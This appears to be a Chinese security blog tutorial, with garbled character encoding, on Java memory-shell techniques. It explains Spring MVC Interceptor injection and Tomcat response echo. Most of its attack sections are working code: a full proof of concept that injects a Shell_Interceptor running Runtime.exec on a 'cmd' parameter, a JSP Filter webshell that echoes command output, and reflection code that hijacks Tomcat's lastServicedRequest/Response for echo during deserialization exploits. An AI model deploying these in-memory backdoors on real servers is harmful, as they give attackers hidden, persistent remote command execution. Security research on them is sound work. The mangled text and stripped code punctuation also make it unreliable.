Interceptorå‹å†…å­˜é©¬åŸºç¡€demoå…ˆç»™å‡ºæˆ‘è°ƒæ•´åçš„ç›®å½•ç»“æ„ï¼Œè¿™æ ·é¡¹ç›®ç»“æ„å°±éå¸¸æ¸…æ™°ï¼š SpringMVCApplicationè¿™ä¸€å¯åŠ¨ç±»å¿…é¡»è¦æ”¾åˆ°åŒ…ä¸‹ã€‚ ControlleråŒ…ä¸‹æ˜¯Controllerå†…å­˜é©¬çš„ç›¸å…³ç±» InterceptoråŒ…ä¸‹æ˜¯Interceptorå†…å­˜é©¬çš„ç›¸å…³ç±» WebConfigä½œä¸ºé…ç½®ç±»ï¼Œæœ¬é¡¹ç›®ä¸»è¦ç”¨æ¥æ³¨å†ŒInterceptor ä¿®æ”¹åçš„BasicControllerå¦‚ä¸‹ï¼ˆæ¨¡æ‹Ÿæ­£å¸¸çš„SpringæœåŠ¡è¿˜æ˜¯è°ƒç”¨è¯¥æ§åˆ¶å™¨ï¼‰ package SpringMVC.Controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.ResponseBody;@Controllerpublic class BasicController // é‡æ„æ§åˆ¶å™¨æ–¹æ³•ï¼Œè¿”å›å€¼ä¸èƒ½ä¸ºé™æ€ç›®å½•ä¸‹çš„èµ„æºï¼Œå¦åˆ™æ— æ³•è°ƒç”¨Interceptor @RequestMapping(/hello) @ResponseBody public String hello() return Hello; @RequestMapping(/login) @ResponseBody public String login() return Login; ä¸è¦è®¾ç½®æ–¹æ³•çš„è¿”å›å€¼æ˜¯é™æ€æ–‡ä»¶ï¼Œä¸ç„¶åé¢å°†æ— æ³•è§¦å‘Interceptorã€‚ æ¦‚è¿°Spring MVCé‡Œçš„Interceptorä¸Tomcaté‡Œçš„Filterç±»ä¼¼ï¼Œéƒ½æ˜¯æ‹¦æˆªç”¨æˆ·è¯·æ±‚å¹¶åšä¸€äº›å¤„ç†ã€‚æ—¢ç„¶åŠŸèƒ½ç›¸ä¼¼ï¼ŒSpring Bootåˆå†…ç½®äº†Tomcatï¼Œé‚£ä¹ˆäºŒè€…ä¼šä¸ä¼šæœ‰å†²çªä¹‹å¤„å‘¢ï¼Ÿå¹¶ä¸ä¼šï¼Œè¯¥é—®é¢˜ä¸‹é¢ä¼šè§£ç­”ã€‚ é‚£ä¹ˆå¦‚ä½•æ„é€ ä¸€ä¸ªç®€å•çš„Interceptorå‘¢ï¼Ÿåœ¨Spring MVCä¸­å®šä¹‰ä¸€ä¸ªInterceptorï¼Œä¸»è¦æœ‰ä»¥ä¸‹ 2 ç§æ–¹å¼ï¼š é€šè¿‡å®ç°HandlerInterceptoræ¥å£æˆ–ç»§æ‰¿HandlerInterceptoræ¥å£çš„å®ç°ç±»ï¼ˆä¾‹å¦‚ HandlerInterceptorAdapterï¼‰æ¥å®šä¹‰ é€šè¿‡å®ç°WebRequestInterceptoæ¥å£æˆ–ç»§æ‰¿WebRequestInterceptoræ¥å£çš„å®ç°ç±»æ¥å®šä¹‰ å½“ç„¶ï¼Œç¬¬ä¸€ç§æ–¹æ³•çš„HandlerInterceptorAdapteråœ¨Spring Framework 5.3Spring Boot 2.4è¢«å¼ƒç”¨äº†ã€‚ æœ¬æ–‡é€šè¿‡å®ç°HandlerInterceptoræ¥å£æ„é€ Interceptorï¼Œå…ˆçœ‹çœ‹HandlerInterceptoræ¥å£æœ‰å‡ ä¸ªæ–¹æ³•ï¼š preHandleï¼šè¯¥æ–¹æ³•åœ¨æ§åˆ¶å™¨çš„å¤„ç†è¯·æ±‚æ–¹æ³•å‰æ‰§è¡Œï¼Œå…¶è¿”å›å€¼è¡¨ç¤ºæ˜¯å¦ä¸­æ–­åç»­æ“ä½œï¼Œè¿”å›trueè¡¨ç¤ºç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œè¿”å› false è¡¨ç¤ºä¸­æ–­åç»­æ“ä½œã€‚ postHandleï¼šè¯¥æ–¹æ³•åœ¨æ§åˆ¶å™¨çš„å¤„ç†è¯·æ±‚æ–¹æ³•è°ƒç”¨ä¹‹åã€è§£æè§†å›¾ä¹‹å‰æ‰§è¡Œï¼Œå¯ä»¥é€šè¿‡æ­¤æ–¹æ³•å¯¹è¯·æ±‚åŸŸä¸­çš„æ¨¡å‹å’Œè§†å›¾åšè¿›ä¸€æ­¥çš„ä¿®æ”¹ã€‚ afterCompletionï¼šè¯¥æ–¹æ³•åœ¨æ§åˆ¶å™¨çš„å¤„ç†è¯·æ±‚æ–¹æ³•æ‰§è¡Œå®Œæˆåæ‰§è¡Œï¼Œå³è§†å›¾æ¸²æŸ“ç»“æŸåæ‰§è¡Œï¼Œå¯ä»¥é€šè¿‡æ­¤æ–¹æ³•å®ç°ä¸€äº›èµ„æºæ¸…ç†ã€è®°å½•æ—¥å¿—ä¿¡æ¯ç­‰å·¥ä½œã€‚ æ‰€ä»¥ä¸€ä¸ªç®€å•çš„Interceptorå¦‚ä¸‹æ‰€ç¤ºï¼š package org.example.springweb.Interceptor;import org.springframework.web.servlet.HandlerInterceptor;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;public class BasicInterceptor implements HandlerInterceptor @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception String url = request.getRequestURI(); if (url.contains(/hello)) return true; // æ”¾è¡Œ response.setContentType(text/plain;charset=UTF-8); response.getWriter().write(This isnt hello); return false; // æ‹¦æˆª æ¥ä¸‹é‡Œæˆ‘ä»¬éœ€è¦å°†å…¶æ³¨å†Œåˆ°é…ç½®ä¸­ï¼Œä½¿æˆ‘ä»¬è®¿é—®æœåŠ¡çš„æ—¶å€™å¯ä»¥ç»è¿‡å®ƒï¼š package org.example.springweb;import org.example.springweb.Interceptor.BasicInterceptor;import org.springframework.context.annotation.Configuration;import org.springframework.web.servlet.config.annotation.InterceptorRegistry;import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;@Configurationpublic class WebConfig implements WebMvcConfigurer @Override public void addInterceptors(InterceptorRegistry registry) //è®¾ç½®æˆè®¿é—®æ‰€æœ‰è·¯å¾„éƒ½ç»è¿‡BasicInterceptor registry.addInterceptor(new BasicInterceptor()) .addPathPatterns(/**); ç„¶åæˆ‘ä»¬è¿è¡Œï¼Œå¹¶ä¸”è®¿é—®ä¸åŒ…å«/helloçš„è·¯ç”± requestè°ƒç”¨æµç¨‹å‰é¢æå‡ºäº†ä¸€ä¸ªé—®é¢˜ï¼šSpring MVCé‡Œçš„Interceptorä¸Tomcaté‡Œçš„Filteræ˜¯å¦ä¼šæœ‰å†²çªï¼Ÿ äº‹å®ä¸Šï¼Œå½“ä¸€ä¸ªRequestå‘é€åˆ°Springåº”ç”¨æ—¶ï¼Œå¤§è‡´ä¼šç»è¿‡å¦‚ä¸‹å‡ ä¸ªå±‚é¢æ‰ä¼šè¿›å…¥Controllerå±‚ï¼š HttpRequest -- Filter -- DispactherServlet -- Interceptor -- Controller è¯·æ±‚é¦–å…ˆè¿›å…¥Filterï¼Œç„¶åç”±DispatcherServletè¿›è¡Œè°ƒåº¦ã€‚åœ¨DispatcherServletå†…éƒ¨ï¼Œä¼šç»è¿‡æ³¨å†Œçš„HandlerInterceptorï¼Œç„¶åæ‰ä¼šè¿›å…¥å…·ä½“çš„Controlleræ–¹æ³• æ¥ä¸‹æ¥æˆ‘ä»¬è¿›è¡Œè°ƒè¯•ï¼Œçœ‹å½“ä¸€ä¸ªRequestå‘é€åˆ°Springåº”ç”¨çš„æ—¶å€™ï¼Œæ˜¯å¦‚ä½•ä¸€æ­¥æ­¥èµ°åˆ°Controllerçš„ åœ¨ApplicationFilterChain#internalDoFilterå¤„ä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„è°ƒç”¨æ ˆæ˜¯å’Œå¯åŠ¨Tomcatæ—¶ç›¸åŒçš„ åœ¨internalDoFilteræ–¹æ³•çš„æœ€åï¼Œä¹Ÿå°±æ˜¯èµ°å®Œäº†æ‰€æœ‰çš„Filterï¼Œä¼šè°ƒç”¨HttpServlet#serviceæ–¹æ³•ã€‚ HttpServlet#serviceæ–¹æ³•æœ€åä¼šè°ƒç”¨åˆ°DispatcherServlet#doDispatchæ–¹æ³•ï¼Œè°ƒç”¨æ ˆå¦‚ä¸‹ï¼š è·Ÿè¿›doDispatchæ–¹æ³• ç»§ç»­è·Ÿè¿›getHandleræ–¹æ³• è¯¥æ–¹æ³•ä¼šé€šè¿‡éå†this.handlerMappingsæ¥è·å–HandlerMappingç±»å®ä¾‹mapping è·Ÿè¿›mapping.getHandleræ–¹æ³•ï¼Œå…ˆè°ƒç”¨getHandlerInternalæ–¹æ³•è·å¾—handlerï¼Œç„¶åè°ƒç”¨getHandlerExecutionChainæ–¹æ³•è¿”å›HandlerExecutionChainç±»çš„å®ä¾‹ï¼š è¯¥æ–¹æ³•é€šè¿‡adaptedInterceptorsï¼ˆç±»å‹ï¼šListï¼‰è·å–æ‰€æœ‰Interceptoråè¿›è¡Œéå†ï¼š this.adaptedInterceptorsä¸­å¯ä»¥çœ‹è§ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±å®šä¹‰çš„Interceptorï¼Œå‰©ä¸‹ä¸¤ä¸ªä¾¿æ˜¯ç³»ç»Ÿå›ºå®šçš„ ç„¶åé€šè¿‡chain.addInterceptoræ–¹æ³•å°†æ‰€æœ‰Interceptoræ·»åŠ åˆ°HandlerExecutionChainä¸­ã€‚æœ€åè¿”å›åˆ°DispatcherServlet#doDispatch()ï¼Œè°ƒç”¨mappedHandler.applyPreHandleæ–¹æ³•ï¼š è·Ÿè¿›åå°±åˆ°æˆ‘ä»¬è‡ªå®šä¹‰çš„Interceptorçš„preHandleæ–¹æ³•äº† æœ€åï¼Œåˆå›åˆ°ApplicationFilterChain#internalDoFilteræ–¹æ³•ï¼Œå›åˆ°Tomcatçš„æµç¨‹ æ”»å‡»æ€è·¯é€šè¿‡ä»¥ä¸Šåˆ†æï¼ŒInterceptorå®é™…ä¸Šæ˜¯å¯ä»¥æ‹¦æˆªæ‰€æœ‰æƒ³åˆ°è¾¾Controllerçš„è¯·æ±‚çš„ã€‚ä¸‹é¢çš„é—®é¢˜å°±æ˜¯å¦‚ä½•åŠ¨æ€åœ°æ³¨å†Œä¸€ä¸ªæ¶æ„çš„Interceptoräº†ã€‚å­¦äº†å¾ˆå¤šç±»å‹çš„å†…å­˜é©¬ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³å‡ºæ€è·¯ï¼š è·å–å½“å‰è¿è¡Œç¯å¢ƒçš„ä¸Šä¸‹æ–‡ å®ç°æ¶æ„Interceptor æ³¨å…¥æ¶æ„Interceptor è·å–ç¯å¢ƒä¸Šä¸‹æ–‡åœ¨Controllerå‹å†…å­˜é©¬ä¸­ï¼Œç»™å‡ºäº†å››ç§è·å–Springä¸Šä¸‹æ–‡ApplicationContextçš„æ–¹æ³•ã€‚ä¸‹é¢æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡åå°„è·å–LiveBeansViewç±»çš„applicationContextså±æ€§æ¥è·å–ä¸Šä¸‹æ–‡ã€‚ // 1. åå°„ org.springframework.context.support.LiveBeansView ç±» applicationContexts å±æ€§java.lang.reflect.Field filed = Class.forName(org.springframework.context.support.LiveBeansView).getDeclaredField(applicationContexts);// 2. å±æ€§è¢« private ä¿®é¥°ï¼Œæ‰€ä»¥ setAccessible truefiled.setAccessible(true);// 3. è·å–ä¸€ä¸ª ApplicationContext å®ä¾‹WebApplicationContext context =(WebApplicationContext) ((LinkedHashSet)filed.get(null)).iterator().next(); org.springframework.context.support.LiveBeansViewç±»åœ¨spring-context 3.2.xç‰ˆæœ¬æ‰åŠ å…¥å…¶ä¸­ï¼Œæ‰€ä»¥æ¯”è¾ƒä½ç‰ˆæœ¬çš„ spring æ— æ³•é€šè¿‡æ­¤æ–¹æ³•è·å¾—ApplicationContextçš„å®ä¾‹ã€‚ äº‹å®ä¸Šï¼Œæˆ‘ä»¬éœ€è¦æŠŠæ¶æ„Interceptotç»™addåˆ°adaptedInterceptorsé‡Œï¼Œæ‰€ä»¥éœ€è¦å…ˆè·å¾—adaptedInterceptorsï¼š AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping)context.getBean(requestMappingHandlerMapping);Field field = AbstractHandlerMapping.class.getDeclaredField(adaptedInterceptors);field.setAccessible(true);ArrayListObject adaptedInterceptors = (ArrayListObject)field.get(abstractHandlerMapping); å®ç°æ¶æ„Interceptorpublic class Shell_Interceptor implements HandlerInterceptor @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception String cmd = request.getParameter(cmd); if (cmd != null) try Runtime.getRuntime().exec(cmd); catch (IOException e) e.printStackTrace(); catch (NullPointerException n) n.printStackTrace(); return true; return false; æ³¨å…¥æ¶æ„InterceptoræŠŠæ¶æ„Interceptotç»™addåˆ°adaptedInterceptorsé‡Œï¼š //å°†æ¶æ„Interceptoræ·»åŠ å…¥adaptedInterceptorsShell_Interceptor shell_interceptor = new Shell_Interceptor();adaptedInterceptors.add(shell_interceptor); å®Œæ•´POCï¼špackage org.example.springweb.Interceptor;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.ResponseBody;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.context.request.ServletRequestAttributes;import org.springframework.web.servlet.HandlerInterceptor;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import org.springframework.web.servlet.support.RequestContextUtils;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;@Controllerpublic class Interceptor_Controller @ResponseBody @RequestMapping(/control2) public void Inject() throws Exception //è·å–ä¸Šä¸‹æ–‡ç¯å¢ƒ WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest()); //è·å–adaptedInterceptorså±æ€§å€¼ org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class); java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(adaptedInterceptors); field.setAccessible(true); java.util.ArrayListObject adaptedInterceptors = (java.util.ArrayListObject)field.get(abstractHandlerMapping); //å°†æ¶æ„Interceptoræ·»åŠ å…¥adaptedInterceptors Shell_Interceptor shell_interceptor = new Shell_Interceptor(); adaptedInterceptors.add(shell_interceptor); public class Shell_Interceptor implements HandlerInterceptor @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception String cmd = request.getParameter(cmd); if (cmd != null) try Runtime.getRuntime().exec(cmd); catch (IOException e) e.printStackTrace(); catch (NullPointerException n) n.printStackTrace(); return true; return false; å…ˆè®¿é—®/control2è·¯ç”±ï¼Œä¹‹åæˆåŠŸæ‰§è¡Œå‘½ä»¤ å†…å­˜é©¬å›æ˜¾æŠ€æœ¯æ‰€è°“å›æ˜¾ï¼Œå…¶å®å°±æ˜¯è·å–å‘½ä»¤æ‰§è¡Œçš„ç»“æœï¼Œè¿™ç§æŠ€æœ¯å¸¸ç”¨äºç›®æ ‡æœºå™¨ä¸å‡ºç½‘ï¼Œæ— æ³•åå¼¹shellçš„æƒ…å†µã€‚å¯¹äºJavaçš„ä¸­é—´ä»¶æ¥è®²ï¼Œå…¶å…³é”®å°±æ˜¯è·å–requestå’Œresponseå¯¹è±¡ å›æ˜¾ç¤ºä¾‹è¿™é‡Œæˆ‘ä»¬ä»¥ä¸Šæ–‡æåˆ°çš„Tomcat Filterå†…å­˜é©¬ä¸ºä¾‹ï¼Œè·å–å¯¹åº”çš„å›æ˜¾ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ %! public class Shell_Filter implements Filter public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException String cmd = request.getParameter(cmd); response.setContentType(text/html; charset=UTF-8); PrintWriter writer = response.getWriter(); if (cmd != null) try InputStream in = Runtime.getRuntime().exec(cmd).getInputStream(); //å°†å‘½ä»¤æ‰§è¡Œç»“æœå†™å…¥æ‰«æå™¨å¹¶è¯»å–æ‰€æœ‰è¾“å…¥ Scanner scanner = new Scanner(in).useDelimiter(\\\\A); String result = scanner.hasNext()?scanner.next():; scanner.close(); writer.write(result); writer.flush(); writer.close(); catch (IOException e) e.printStackTrace(); catch (NullPointerException n) n.printStackTrace(); chain.doFilter(request, response); % ä¸Šè¿°æ–¹å¼æˆ‘ä»¬æ˜¯é€šè¿‡JSPæ–‡ä»¶æ¥æ³¨å…¥å†…å­˜é©¬çš„ã€‚ç”±äºJSPä¸­å†…ç½®äº†ä¸€äº›å…³é”®å¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬èƒ½å¤Ÿå¾ˆå®¹æ˜“åœ°è·å¾—Requestå’ŒResponseå¯¹è±¡ï¼Œå¹¶èƒ½é€šè¿‡ä»–ä»¬æ¥è·å–ç›®æ ‡JVMçš„ä¸Šä¸‹æ–‡Contextã€‚é‚£å¦‚æœæˆ‘ä»¬è¦é€šè¿‡ååºåˆ—åŒ–æ¼æ´æ¥æ³¨å…¥å†…å­˜é©¬ï¼Œåˆå¦‚ä½•è·å–åˆ°ç›®æ ‡JVMçš„requestå’Œresponseå¯¹è±¡å‘¢ï¼Ÿ ThreadLocal Responseå›æ˜¾æ€è·¯æ¥è‡ªäº@kingkkå¸ˆå‚… é¦–å…ˆè¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬å¯»æ‰¾çš„requestå¯¹è±¡åº”è¯¥æ˜¯ä¸€ä¸ªå’Œå½“å‰çº¿ç¨‹ThreadLocalæœ‰å…³çš„å¯¹è±¡ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ã€‚è¿™æ ·æ‰èƒ½è·å–åˆ°å½“å‰çº¿ç¨‹çš„ç›¸å…³ä¿¡æ¯ã€‚æœ€ç»ˆæˆ‘ä»¬èƒ½å¤Ÿåœ¨org.apache.catalina.core.ApplicationFilterChainç±»ä¸­æ‰¾åˆ°è¿™æ ·ä¸¤ä¸ªå˜é‡*lastServicedRequestå’ŒlastServicedResponse*ã€‚å¹¶ä¸”è¿™ä¸¤ä¸ªå±æ€§è¿˜æ˜¯é™æ€çš„ï¼Œæˆ‘ä»¬è·å–æ—¶æ— éœ€å®ä¾‹åŒ–å¯¹è±¡ åœ¨ApplicationFilterChain#internalDoFilterä¸­ï¼ŒTomcatä¼šå°†requestå¯¹è±¡å’Œresponseå¯¹è±¡å­˜å‚¨åˆ°è¿™ä¸¤ä¸ªå˜é‡ä¸­ è™½ç„¶æ­¤æ—¶çš„ApplicationDispatcher.*WRAP_SAME_OBJECT*ä¸ºfalseï¼Œä½†æ˜¯æˆ‘ä»¬åç»­å¯ä»¥é€šè¿‡åå°„ä¿®æ”¹ï¼Œæ­£å¸¸ä¸ºå…¶èµ‹å€¼çš„ä»£ç å¦‚ä¸‹ï¼š å¯ä»¥æ€»ç»“æ€è·¯å¦‚ä¸‹ åå°„ä¿®æ”¹ApplicationDispatcher.WRAP_SAME_OBJECTçš„å€¼ï¼Œé€šè¿‡ThreadLocal#setæ–¹æ³•å°†requestå’Œresponseå¯¹è±¡å­˜å‚¨åˆ°å˜é‡ä¸­ åˆå§‹åŒ–lastServicedRequestå’ŒlastServicedResponseä¸¤ä¸ªå˜é‡ï¼Œé»˜è®¤ä¸ºnull é€šè¿‡ThreadLocal#getæ–¹æ³•å°†requestå’Œresponseå¯¹è±¡ä»*lastServicedRequestå’ŒlastServicedResponse*ä¸­å–å‡º åå°„å­˜å‚¨requestå’Œresponse//åå°„è·å–æ‰€éœ€å±æ€§Field WRAP_SAME_OBJECT_FIELD = Class.forName(org.apache.catalina.core.ApplicationDispatcher).getDeclaredField(WRAP_SAME_OBJECT);Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(lastServicedRequest);Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField(lastServicedResponse); //ä½¿ç”¨modifiersFieldåå°„ä¿®æ”¹finalå‹å˜é‡java.lang.reflect.Field modifiersField = Field.class.getDeclaredField(modifiers);modifiersField.setAccessible(true);modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() ~Modifier.FINAL);modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() ~Modifier.FINAL);modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() ~Modifier.FINAL);WRAP_SAME_OBJECT_FIELD.setAccessible(true);lastServicedRequestField.setAccessible(true);lastServicedResponseField.setAccessible(true);//å°†å˜é‡WRAP_SAME_OBJECT_FIELDè®¾ç½®ä¸ºtrueif (!WRAP_SAME_OBJECT_FIELD.getBoolean(null)) WRAP_SAME_OBJECT_FIELD.setBoolean(null,true); åˆå§‹åŒ–å˜é‡ç”±äºå˜é‡åœ¨Tomcatåˆå§‹åŒ–è¿è¡Œçš„æ—¶å€™ä¼šè¢«è®¾ç½®ä¸ºnullï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦åˆå§‹åŒ–lastServicedRequestå’ŒlastServicedResponseå˜é‡ä¸ºThreadLocalç±» if (lastServicedRequestField.get(null)==null) lastServicedRequestField.set(null, new ThreadLocal()); if (lastServicedResponseField.get(null)==null) lastServicedResponseField.set(null, new ThreadLocal()); è·å–requestå˜é‡if(lastServicedRequestField.get(null)!=null) ThreadLocal threadLocal = (ThreadLocal) lastServicedRequestField.get(null); ServletRequest servletRequest = (ServletRequest) threadLocal.get(); System.out.println(servletRequest); System.out.println((HttpServletRequest) servletRequest == req); ä¸‹é¢æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªç®€å•çš„demoçœ‹çœ‹æ•ˆæœï¼Œç¼–å†™ä¸€ä¸ªç®€å•çš„Servlet import org.apache.catalina.core.ApplicationFilterChain; import javax.servlet.ServletException;import javax.servlet.ServletRequest;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Modifier; @WebServlet(/echo)public class Tomcat_Echo extends HttpServlet @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException try //åå°„è·å–æ‰€éœ€å±æ€§ Field WRAP_SAME_OBJECT_FIELD = Class.forName(org.apache.catalina.core.ApplicationDispatcher).getDeclaredField(WRAP_SAME_OBJECT); Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(lastServicedRequest); Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField(lastServicedResponse); //ä½¿ç”¨modifiersFieldåå°„ä¿®æ”¹finalå‹å˜é‡ java.lang.reflect.Field modifiersField = Field.class.getDeclaredField(modifiers); modifiersField.setAccessible(true); modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() ~Modifier.FINAL); modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() ~Modifier.FINAL); modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() ~Modifier.FINAL); WRAP_SAME_OBJECT_FIELD.setAccessible(true); lastServicedRequestField.setAccessible(true); lastServicedResponseField.setAccessible(true); //å°†å˜é‡WRAP_SAME_OBJECT_FIELDè®¾ç½®ä¸ºtrueï¼Œå¹¶åˆå§‹åŒ–lastServicedRequestå’ŒlastServicedResponseå˜é‡ if (!WRAP_SAME_OBJECT_FIELD.getBoolean(null)) WRAP_SAME_OBJECT_FIELD.setBoolean(null,true); if (lastServicedRequestField.get(null)==null) lastServicedRequestField.set(null, new ThreadLocal()); if (lastServicedResponseField.get(null)==null) lastServicedResponseField.set(null, new ThreadLocal()); //è·å–requestå˜é‡ if(lastServicedRequestField.get(null)!=null) ThreadLocal threadLocal = (ThreadLocal) lastServicedRequestField.get(null); ServletRequest servletRequest = (ServletRequest) threadLocal.get(); System.out.println(servletRequest); System.out.println((HttpServletRequest) servletRequest == req); catch (NoSuchFieldException e) e.printStackTrace(); catch (ClassNotFoundException e) e.printStackTrace(); catch (IllegalAccessException e) e.printStackTrace(); ä¸‹æ–­ç‚¹è¿›è¡Œè°ƒè¯•ï¼Œç¬¬ä¸€æ¬¡è¯·æ±‚/echoï¼Œç”±äºIS_SECURITY_ENABLEDçš„é»˜è®¤å€¼æ˜¯falseï¼Œæ‰€ä»¥æ‰§è¡Œåˆ°service()æ–¹æ³• service()ä¸­è°ƒç”¨doGet()ï¼Œå°±è°ƒç”¨åˆ°äº†pocä¸­çš„doGet()æ–¹æ³•ä¸­ï¼Œå¯¹ä¸Šè¾¹æåˆ°çš„ä¸‰ä¸ªå˜é‡è¿›è¡Œäº†èµ‹å€¼ï¼š ä¹‹åWRAP_SAME_OBJECTå˜ä¸ºtrueï¼Œè¿›å…¥äº†ifï¼Œå°†lastServicedRequestå’ŒlastServicedResponseè®¾ä¸ºobjectç±»å‹çš„null ç¬¬äºŒæ¬¡è®¿é—®echoçš„æ—¶å€™éšä¾¿getä¼ å‚ä¸€ä¸‹ ç”±äºç¬¬ä¸€æ¬¡å·²ç»å°†WRAP_SAME_OBJECTèµ‹å€¼ï¼Œæ‰€ä»¥è¿™æ¬¡é¡ºåˆ©è¿›å»ifä»å¥ä¸­å¹¶è¿›è¡Œèµ‹å€¼ æ¥ç€èµ°åˆ°æˆ‘ä»¬è‡ªå·±å†™çš„doGetæ–¹æ³•ä¸­ï¼Œå¯ä»¥å‘ç°è·å–åˆ°çš„æ­£æ˜¯å½“å‰Servletçº¿ç¨‹ä¸­å­˜å‚¨çš„request åœ¨æ—¥å¿—é‡Œæ‰“å°äº†å‡ºæ¥ å±€é™æ€§å¦‚æœæ¼æ´åœ¨ApplicationFilterChainè·å–å›æ˜¾Responseä»£ç ä¹‹å‰ï¼Œé‚£ä¹ˆå°±æ— æ³•è·å–åˆ°Tomcat Responseè¿›è¡Œå›æ˜¾ã€‚å¦‚Shiro RememberMeååºåˆ—åŒ–æ¼æ´ï¼Œå› ä¸ºShiroçš„RememberMeåŠŸèƒ½å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰çš„Filterã€‚æˆ‘ä»¬çŸ¥é“åœ¨ApplicationFilterChain#internalDoFilteræ–¹æ³•ä¸­ï¼ŒdoFilteræ–¹æ³•å®é™…ä¸Šæ˜¯åœ¨æˆ‘ä»¬è·å–responseä¹‹å‰çš„ã€‚å› æ­¤åœ¨Shiroæ¼æ´ç¯å¢ƒä¸‹æˆ‘ä»¬æ— æ³•é€šè¿‡è¿™ç§æ–¹å¼è·å¾—å›æ˜¾ã€‚ private void internalDoFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException // Call the next filter if there is one if (pos n) ApplicationFilterConfig filterConfig = filters[pos++]; try ... else //Shiroæ¼æ´è§¦å‘ç‚¹ filter.doFilter(request, response, this); ... // We fell off the end of the chain -- call the servlet instance try //responseå›æ˜¾è§¦å‘ç‚¹ if (ApplicationDispatcher.WRAP_SAME_OBJECT) lastServicedRequest.set(request); lastServicedResponse.set(response); ... else servlet.service(request, response); ... é€šè¿‡å…¨å±€å­˜å‚¨Responseå›æ˜¾æ€è·¯æ¥è‡ªäº@Litch1å¸ˆå‚… Servletå®¹å™¨æ˜¯Java Webçš„æ ¸å¿ƒï¼Œå› æ­¤å¾ˆå¤šæ¡†æ¶å¯¹äºè¯¥å®¹å™¨éƒ½è¿›è¡Œäº†ä¸€å®šç¨‹åº¦çš„å°è£…ã€‚ä¸åŒæ¡†æ¶ã€åŒä¸€æ¡†æ¶çš„ä¸åŒç‰ˆæœ¬çš„å®ç°éƒ½æœ‰å¯èƒ½ä¸åŒï¼Œå› æ­¤æˆ‘ä»¬å¾ˆéš¾æ‰¾åˆ°ä¸€ç§é€šç”¨çš„è·å–å›æ˜¾çš„æ–¹æ³•ã€‚ æ¯”å¦‚æˆ‘ä»¬ä¸Šæ–‡é€šè¿‡ThreadLocalç±»æ¥è·å–å›æ˜¾çš„æ–¹å¼å°±æ— æ³•é€‚ç”¨äºShiroæ¡†æ¶ä¸‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬èƒ½ä¸èƒ½æ¢ä¸€ç§æ€è·¯ï¼Œå¯»æ‰¾Tomcatä¸­å…¨å±€å­˜å‚¨çš„Requestå’ŒResponseå‘¢ï¼Ÿ ä½†æˆ‘ä»¬çŸ¥é“æƒ³è¦è·å–å›æ˜¾ï¼Œrequestå’Œresponseå¯¹è±¡å¿…é¡»æ˜¯å±äºå½“å‰çº¿ç¨‹çš„ï¼Œå› æ­¤é€šè¿‡å…¨å±€å­˜å‚¨è·å–å›æ˜¾çš„å…³é”®å°±åœ¨äºæ‰¾åˆ°å½“å‰ä»£ç è¿è¡Œçš„ä¸Šä¸‹æ–‡å’ŒTomcatè¿è¡Œä¸Šä¸‹æ–‡çš„è”ç³» å¯»æ‰¾å…¨å±€Responseé¦–å…ˆæˆ‘ä»¬å…ˆæ¥å¯»æ‰¾ä¸€ä¸‹Tomcatä¸­çš„ä¸€äº›å…¨å±€Responseã€‚åœ¨AbstractProcessorç±»ä¸­ï¼Œæˆ‘ä»¬èƒ½å¤Ÿæ‰¾åˆ°å…¨å±€response è°ƒç”¨æ ˆåˆ†ææˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹Tomcatçš„è°ƒç”¨æ ˆ doGet:25, Tomcat_Echoservice:655, HttpServlet (javax.servlet.http)service:764, 